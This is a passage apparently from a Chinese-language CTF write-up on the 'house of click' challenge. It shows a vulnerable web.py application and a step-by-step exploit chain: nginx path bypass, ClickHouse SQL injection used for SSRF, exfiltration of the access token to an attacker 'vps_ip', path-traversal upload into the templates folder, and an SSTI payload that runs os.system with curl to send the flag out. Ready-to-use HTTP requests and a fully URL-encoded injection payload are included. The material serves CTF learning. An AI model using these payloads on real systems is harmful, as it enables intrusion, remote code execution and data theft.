    <span class="n">TOKEN</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">urls</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s1">'/'</span><span class="p">,</span> <span class="s1">'Index'</span><span class="p">,</span>
    <span class="s1">'/query'</span><span class="p">,</span> <span class="s1">'Query'</span><span class="p">,</span>
    <span class="s1">'/api/ping'</span><span class="p">,</span> <span class="s1">'Ping'</span><span class="p">,</span>
    <span class="s1">'/api/token'</span><span class="p">,</span> <span class="s1">'Token'</span><span class="p">,</span>
    <span class="s1">'/api/upload'</span><span class="p">,</span> <span class="s1">'Upload'</span><span class="p">,</span>
<span class="p">)</span>

<span class="n">render</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">'templates/'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">check_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">ip_range</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_network</span><span class="p">(</span><span class="n">ip_range</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">Index</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">render</span><span class="o">.</span><span class="n">index</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">input</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">'index'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">render</span><span class="o">.</span><span class="fm">__getattr__</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">name</span><span class="p">)()</span>


<span class="k">class</span> <span class="nc">Query</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">input</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s1">'1'</span><span class="p">)</span>

        <span class="n">client</span> <span class="o">=</span> <span class="n">clickhouse_connect</span><span class="o">.</span><span class="n">get_client</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'db'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8123</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="s1">'default'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">'default'</span><span class="p">)</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s1">'SELECT * FROM web.users WHERE id = '</span> <span class="o">+</span> <span class="n">data</span><span class="o">.</span><span class="n">id</span>
        <span class="n">client</span><span class="o">.</span><span class="n">command</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="k">return</span> <span class="s1">'ok'</span>


<span class="k">class</span> <span class="nc">Ping</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="s1">'pong'</span>


<span class="k">class</span> <span class="nc">Token</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'REMOTE_ADDR'</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">check_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="s1">'172.28.0.0/16'</span><span class="p">):</span>
            <span class="k">return</span> <span class="s1">'forbidden'</span>
        <span class="k">return</span> <span class="n">TOKEN</span>


<span class="k">class</span> <span class="nc">Upload</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'REMOTE_ADDR'</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'HTTP_X_ACCESS_TOKEN'</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">check_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="s1">'172.28.0.0/16'</span><span class="p">):</span>
            <span class="k">return</span> <span class="s1">'forbidden'</span>
        <span class="k">if</span> <span class="n">token</span> <span class="o">!=</span> <span class="n">TOKEN</span><span class="p">:</span>
            <span class="k">return</span> <span class="s1">'unauthorized'</span>

        <span class="n">files</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">input</span><span class="p">(</span><span class="n">myfile</span><span class="o">=</span><span class="p">{})</span>
        <span class="k">if</span> <span class="s1">'myfile'</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="n">filepath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'upload/'</span><span class="p">,</span> <span class="n">files</span><span class="o">.</span><span class="n">myfile</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filepath</span><span class="p">)):</span>
                <span class="k">return</span> <span class="s1">'error'</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">files</span><span class="o">.</span><span class="n">myfile</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
        <span class="k">return</span> <span class="s1">'ok'</span>


<span class="n">app</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">application</span><span class="p">(</span><span class="n">urls</span><span class="p">,</span> <span class="nb">globals</span><span class="p">())</span>
<span class="n">application</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">wsgifunc</span><span class="p">(</span><span class="n">web</span><span class="o">.</span><span class="n">httpserver</span><span class="o">.</span><span class="n">StaticMiddleware</span><span class="p">)</span>
</pre></div>
<blockquote>
<p>简单分析下代码，存在一个Upload类，因为直接通过<code>os.path.join</code>拼接文件名，所以这里是存在文件上传穿越问题的，前提是需要获取到<code>token</code>，并且需要<code>ip</code>是<code>172</code>的也就是应该是用本机的<code>IP</code>发起请求，其次<code>render.__getattr__(data.name)()</code>中，通过<code>__getattr__</code>直接获取<code>render</code>其它属性。</p>
</blockquote>
<p>1、关于<code>Clickhouse</code>数据库进行<code>SSRF</code>，在<code>Clickhouse</code>中存在<code>URL</code>参数能够发起<code>http</code>请求：</p>
<ol>
<li>
<p><strong>URL</strong>:<strong>HTTP</strong>或<strong>HTTPS</strong>服务器地址，可以接受GET或POST请求（相应地用于SELECT或INSERT查询</p>
</li>
<li>
<p><strong>format</strong>：数据的格式</p>
</li>
<li>
<p><strong>structure</strong>：如<code>UserID UInt64，Name String</code>格式的表结构</p>
</li>
<li>
<p><strong>headers</strong>：<code>key1=value1，key2=value2</code>格式的标头。您可以设置HTTP调用的标头</p>
</li>
</ol>
<p>2、 如<code>select * from url('http://ip:port/','TabSeparatedRaw','x String'))</code></p>
<p>表示通过<code>URL</code>函数获取数据，<code>TabSeparatedRaw</code>表示<code>返回的数据采用制表符分隔的原始数据格式</code>，<code>x String</code>表示<code>外部查询返回的数据类型为字符串</code>。</p>
<p>3、 因为<code>sql = 'SELECT * FROM web.users WHERE id = ' + data.id</code>没进行任何过滤进行拼接的，可以通过请求<code>/api/token</code>的形式来获取<code>Token</code>,<code>||</code>是连接运算符。</p>
<pre><code>SELECT * FROM url('http://ip:port/?a='||hex((select * FROM url('http://backend:8001/api/token', 'TabSeparatedRaw', 'x String'))), 'TabSeparatedRaw', 'x String');</code></pre>
<p>4、如何访问<code>query</code>路由呢，这里是<code>nginx+gunicorn</code>路径绕过。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171449-83eb3b7a-c1ab-1.png"/></p>
<p>这样子即可得到token的值</p>
<div class="highlight"><pre><span></span><span class="err">POST /query  HTTP/1.1/../../api/ping HTTP/1.1</span>
<span class="err">   Host: 192.168.23.137:8013</span>
<span class="err">   Content-Length: 176</span>
<span class="err">   Pragma: no-cache</span>
<span class="err">   Cache-Control: no-cache</span>
<span class="err">   Upgrade-Insecure-Requests: 1</span>
<span class="err">   User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36</span>
<span class="err">   Origin: http://192.168.23.137:8013</span>
<span class="err">   Content-Type: application/x-www-form-urlencoded</span>
<span class="err">   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="err">   Referer: http://192.168.23.137:8013/</span>
<span class="err">   Accept-Encoding: gzip, deflate</span>
<span class="err">   Accept-Language: zh-CN,zh;q=0.9</span>
<span class="err">   Connection: close</span>

<span class="err">   id=1 and (SELECT * FROM url('http://vps_ip:port/?a='||hex((select * FROM url('http://backend:8001/api/token', 'TabSeparatedRaw', 'x String'))), 'TabSeparatedRaw', 'x String'));</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202175931-c28d38be-c1b1-1.png"/></p>
<p>5、拿到<code>Token</code>的值，可以通过<code>/api/upload</code>接口进行文件上传并且目录穿越到<code>templates</code>目录，实现<code>SSTI</code>。</p>
<pre><code>$code:　　
        __import__('os').system('curl http://vps_ip:port/?flag=`/readflag | base64`')</code></pre>
<p>6、 这样还是需要通过<code>ClickHouse</code>来请求<code>/api/upload</code>接口，完成文件的上传，通过<code>INSERT INTO FUNCTION 是用于将数据插入到自定义函数中的语法</code>。</p>
<div class="highlight"><pre><span></span><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">FUNCTION</span> <span class="n">url</span><span class="p">(</span><span class="s1">'http://backend:8001/api/upload'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'x String'</span><span class="p">,</span> <span class="n">headers</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="o">=</span><span class="s1">'multipart/form-data; boundary=----test'</span><span class="p">,</span> <span class="s1">'X-Access-Token'</span><span class="o">=</span><span class="s1">'36044d6e99708446ae269b0398fee3ab'</span><span class="p">))</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'------test\r\nContent-Disposition: form-data; name="myfile"; filename="../templates/test.html"\r\nContent-Type: text/plain\r\n\r\n$code:\r\n    __import__(\'</span><span class="n">os</span><span class="err">\</span><span class="s1">').system(\'</span><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="p">:</span><span class="n">port</span><span class="o">/?</span><span class="n">flag</span><span class="o">=`/</span><span class="n">readflag</span> <span class="o">|</span> <span class="n">base64</span><span class="o">`</span><span class="err">\</span><span class="s1">')\r\n------test--'</span><span class="p">);</span><span class="s1">','</span><span class="n">TabSeparatedRaw</span><span class="s1">','</span><span class="n">x</span> <span class="n">String</span><span class="err">'</span><span class="p">)</span>
</pre></div>
<pre><code>进行URL编码后:</code></pre>
<pre><code>id=1 AND (SELECT * FROM url('http://default:default@db:8123/?query=%2549%254e%2553%2545%2552%2554%2520%2549%254e%2554%254f%2520%2546%2555%254e%2543%2554%2549%254f%254e%2520%2575%2572%256c%2528%2527%2568%2574%2574%2570%253a%252f%252f%2562%2561%2563%256b%2565%256e%2564%253a%2538%2530%2530%2531%252f%2561%2570%2569%252f%2575%2570%256c%256f%2561%2564%2527%252c%2520%2527%2554%2561%2562%2553%2565%2570%2561%2572%2561%2574%2565%2564%2552%2561%2577%2527%252c%2520%2527%2578%2520%2553%2574%2572%2569%256e%2567%2527%252c%2520%2568%2565%2561%2564%2565%2572%2573%2528%2527%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%2527%253d%2527%256d%2575%256c%2574%2569%2570%2561%2572%2574%252f%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%2562%256f%2575%256e%2564%2561%2572%2579%253d%252d%252d%252d%252d%2574%2565%2573%2574%2527%252c%2520%2527%2558%252d%2541%2563%2563%2565%2573%2573%252d%2554%256f%256b%2565%256e%2527%253d%2527%2530%2536%2561%2531%2538%2531%2562%2535%2534%2537%2534%2564%2530%2532%2530%2563%2532%2532%2533%2537%2563%2565%2561%2534%2533%2533%2535%2565%2565%2536%2566%2564%2527%2529%2529%2520%2556%2541%254c%2555%2545%2553%2520%2528%2527%252d%252d%252d%252d%252d%252d%2574%2565%2573%2574%255c%2572%255c%256e%2543%256f%256e%2574%2565%256e%2574%252d%2544%2569%2573%2570%256f%2573%2569%2574%2569%256f%256e%253a%2520%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%256e%2561%256d%2565%253d%2522%256d%2579%2566%2569%256c%2565%2522%253b%2520%2566%2569%256c%2565%256e%2561%256d%2565%253d%2522%252e%252e%252f%2574%2565%256d%2570%256c%2561%2574%2565%2573%252f%2574%2565%2573%2574%252e%2568%2574%256d%256c%2522%255c%2572%255c%256e%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2574%2565%2578%2574%252f%2570%256c%2561%2569%256e%255c%2572%255c%256e%255c%2572%255c%256e%2524%2563%256f%2564%2565%253a%255c%2572%255c%256e%2520%2520%2520%2520%255f%255f%2569%256d%2570%256f%2572%2574%255f%255f%2528%255c%2527%256f%2573%255c%2527%2529%252e%2573%2579%2573%2574%2565%256d%2528%255c%2527%2563%2575%2572%256c%2520%2568%2574%2574%2570%253a%252f%252f%2568%256f%2573%2574%252e%2564%256f%2563%256b%2565%2572%252e%2569%256e%2574%2565%2572%256e%2561%256c%253a%2535%2535%2535%2535%252f%253f%2566%256c%2561%2567%253d%2560%252f%2572%2565%2561%2564%2566%256c%2561%2567%2520%257c%2520%2562%2561%2573%2565%2536%2534%2560%255c%2527%2529%255c%2572%255c%256e%252d%252d%252d%252d%252d%252d%2574%2565%2573%2574%252d%252d%2527%2529%253b', 'TabSeparatedRaw', 'x String'))</code></pre>
<p>7、 最终直接访问上传后的模板<code>test.html</code>即可RCE</p>
<p>思路：通过<code>路径绕过nginx反向代理</code>，再通过<code>ClickHouse SQL</code>注入实现SSRF，最终传入SSTI执行</p>
<h1 data-content="1" id="5783da891ef2a489355ef495b489f55f">总结</h1>
<p><code>ez_wordpress</code>与<code>house of click</code>质量很高，<code>house of click</code>有的云里雾里的，因为没接触过<code>house of click</code>数据库，其实还有一题ActiveMQ的反序列化题目，实在没有研究过CVE-2023-46604源码，就不复现了。</p>
</div>
</div>